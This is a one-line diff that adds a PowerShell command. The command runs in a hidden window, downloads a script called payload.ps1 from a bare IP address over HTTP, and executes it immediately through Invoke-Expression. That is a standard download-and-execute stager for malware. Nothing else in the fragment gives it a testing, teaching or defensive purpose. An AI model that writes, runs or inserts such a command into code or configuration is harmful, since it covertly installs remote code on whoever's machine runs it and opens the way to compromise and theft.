@@ -1,0 +1,1 @@
+powershell -windowstyle hidden @Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://54.209.226.250/payload.ps1')@
